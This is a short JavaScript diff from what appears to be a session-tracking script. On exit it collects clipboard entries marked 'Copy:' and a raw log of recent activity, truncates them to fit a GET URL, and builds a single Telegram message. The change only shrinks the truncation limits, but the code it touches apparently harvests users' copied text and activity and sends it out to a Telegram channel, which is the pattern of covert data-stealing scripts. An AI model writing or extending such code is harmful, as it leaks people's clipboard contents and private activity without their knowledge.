@@ -118,13 +118,13 @@
         const duration = Math.round((new Date() - sessionStartTime) / 1000);
         exitSent = true;
 
-        // 1. Prepare Rich Data & Safety Truncation (URL limit ~2000 chars for GET)
+        // 1. Prepare Rich Data & Safety Truncation (Reduced limits for URL safety)
         const clipboardEntries = localHistory
             .filter(e => e.includes('Copy:'))
             .join('\n')
-            .substring(0, 1200);
+            .substring(0, 600); // Reduced from 1200 to 600
 
-        const rawLog = localHistory.slice(-20).join('\n').substring(0, 1200);
+        const rawLog = localHistory.slice(-15).join('\n').substring(0, 600); // Reduced from -20 and 1200
 
         // 2. Build Comprehensive Telegram Message (SINGLE MESSAGE)
         const separator = `━━━━━━━━━━━━━━━━━━━━━`;
